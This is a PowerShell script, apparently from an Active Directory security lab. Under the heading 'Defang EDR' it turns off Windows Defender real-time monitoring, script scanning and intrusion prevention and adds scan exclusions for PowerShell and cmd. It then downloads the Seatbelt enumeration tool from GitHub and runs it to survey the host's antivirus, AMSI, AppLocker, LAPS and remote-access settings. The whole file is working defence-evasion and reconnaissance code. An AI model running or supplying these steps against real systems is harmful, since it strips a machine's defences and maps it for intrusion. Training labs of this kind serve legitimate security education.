Write-Output "[*] Setup" 
New-Item -ItemType Directory -Path "C:\ADSH" -Force > $null
Write-Output "[*] Defang EDR" 
Set-MpPreference -ExclusionPath 'c:\users\Administrator'
Set-MpPreference -ExclusionPath 'c:\ADSH'
Set-MpPreference -ExclusionProcess "powershell.exe", "cmd.exe", "seatbelt.exe"
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -EnableNetworkProtection AuditMode
Set-MpPreference -Force -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend

Write-Output "[*] Setup" 
New-Item -ItemType Directory -Path "C:\ADSH\Seatbelt" -Force > $null
cd C:\ADSH\Seatbelt
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -URI "https://github.com/DefensiveOrigins/SharpCollection/raw/refs/heads/master/NetFramework_4.5_Any/Seatbelt.exe" -OutFile C:\ADSH\Seatbelt\seatbelt.exe
$ProgressPreference = 'Continue'
ls C:\ADSH\Seatbelt\ | Select-Object Name, Length

Write-Output "[*] Run Seatbelt" 
./seatbelt.exe

./seatbelt -q OSInfo

./seatbelt -q AMSIProviders
./seatbelt -q AntiVirus
./seatbelt -q WindowsDefender
./seatbelt -q AppLocker
./seatbelt -q InterestingProcesses

.\seatbelt -q DotNet
.\seatbelt -q PowerShell

# .\seatbelt -q HotFixes # This command may take a long time to run, we'll skip it for now.
.\seatbelt -q MicrosoftUpdates
.\seatbelt -q InstalledProducts

.\seatbelt -q NTLMSettings
.\seatbelt -q RDPSettings
.\seatbelt -q SCCM
.\seatbelt -q LAPS


Write-Output "[!] Done"